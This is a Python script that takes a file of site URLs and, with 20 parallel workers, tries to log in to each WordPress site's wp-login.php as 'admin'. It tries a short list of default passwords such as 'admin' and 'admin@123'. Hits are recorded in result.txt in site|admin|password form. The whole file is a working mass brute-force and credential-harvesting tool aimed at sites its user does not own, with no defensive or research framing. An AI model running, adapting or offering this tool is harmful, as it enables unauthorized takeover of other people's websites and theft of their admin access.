import requests
from multiprocessing import Pool
import logging

# Konfigurasi logging
logging.basicConfig(filename='script.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s: %(message)s')

def login(site, session, password):
    try:
        url = f'{site}/wp-login.php'
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'wordpress_test_cookie=WP%20Cookie%20check',
            'origin': site,
            'referer': f'{url}?redirect_to={site}/wp-admin/&reauth=1',
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/120.0.0.0',
            'Connection': 'keep-alive'
        }
        data = {
            'log': 'admin',
            'pwd': password,
            'wp-submit': 'Log+In',
            'redirect_to': f'{site}/wp-admin/',
            'testcookie': '1'
        }

        response = session.post(url, headers=headers, data=data, allow_redirects=False)

        if response.status_code in [301, 302, 303]:
            with open("result.txt", "a") as result_file:
                result_file.write(f'{site}/wp-login.php|admin|{password}\n')
            print(f"\033[32m{site} [admin:{password}]\033[0m")
            return True
        else:
            print(f"\033[31m{site} [Failed]\033[0m")
    except Exception as e:
        logging.error(f"Exception in login function for {site}: {e}")
        return False

def process_site(site):
    with requests.Session() as session:
        for password in ['admin', 'pass', 'admin@123', 'admin@admin123', 'admin@pass#123', 'admin@pass@123']:
            if login(site.strip(), session, password):
                return True
        return False

if __name__ == '__main__':
    success_count = 0
    failed_count = 0

    file = input("File: ")

    with open(file, "r") as file_content:
        sites = file_content.readlines()

    pool = Pool(processes=20)
    results = pool.map(process_site, sites)
    pool.close()
    pool.join()

    success_count = sum(results)
    failed_count = len(results) - success_count

    print(f"\nTotal Success: {success_count}")
    print(f"Total Failed: {failed_count}")
